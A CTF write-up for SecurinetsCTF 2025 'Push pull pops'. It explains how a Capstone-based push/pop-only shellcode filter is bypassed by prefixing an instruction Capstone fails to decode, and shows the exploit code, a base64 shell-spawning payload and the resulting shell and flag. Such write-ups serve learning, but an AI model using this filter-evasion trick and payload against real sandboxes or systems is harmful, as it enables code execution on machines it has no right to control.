+++
author = "vmpr0be"
title = "SecurinetsCTF 2025 Quals - Push pull pops"
date = "2025-10-05"
categories = ["ctf"]
+++

### Overview

We're given a Python script that takes base64 input and decodes it, expecting x86_64 assembly code to execute.

```python
...
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from capstone import CS_OP_REG
...

def check(code: bytes):
    if len(code) > 0x2000:
        return False

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    for insn in md.disasm(code, 0):
        name = insn.insn_name()
        if name!="pop" and name!="push" :
            if name=="int3" :
                continue
            return False
        if insn.operands[0].type!=CS_OP_REG:
            return False
            
        
    return True

def run(code: bytes):
    # Runs the code
    ...

def main():
    code = input("Shellcode : ")
    code = base64.b64decode(code.encode())
  
    ...

    if check(code):
        run(code)
  
    ...
```

We notice that the disassembler used in this challenge is [Capstone](https://github.com/capstone-engine/capstone).

For the script to run the given code, the following conditions must be met:
- The disassembled instruction must be `PUSH`, `POP`, or `INT3`.
- The `PUSH` and `POP` instructions must only contain a `REGx` as the first operand.

If any condition isn't met, the program will not run our code.

### Vulnerability

The vulnerability is in the check function, it keeps disassembling instructions until it hits an invalid instruction. This means if we provide an invalid instruction as the first instruction, it won't be disassembled without returning an error, thus skipping the next instructions.

### Exploitation

To exploit this vulnerability, we need to find an instruction that is valid to execute by the CPU but considered invalid for the disassembler.

Luckily there's [a still open issue](https://github.com/capstone-engine/capstone/issues/2442) about an instruction that isn't correctly disassembled wich is then deemed invalid.
After slight edit of the problematic instruction, we end up with the following instruction:

```
movsxd ecx, eax 
```

We just need to insert this instruction at the beginning of our shellcode to make the check function exit early due to that instruction being invalid.

```python
shellcode = b"\x63\xc8" # movsxd ecx, eax
shellcode += asm(shellcraft.sh()) # crafted shellcode that opens a shell
```

We then encode the shellcode in base64 and give it to the server:

```bash
> nc pwn-14caf623.p1.securinets.tn 9001

Shellcode : Y8hqaEi4L2Jpbi8vL3NQSInnaHJpAQGBNCQBAQEBMfZWagheSAHmVkiJ5jHSajtYDwU=

# We're now in a shell
> cat app/flag.txt
> Securinets{push_pop_to_hero}
```
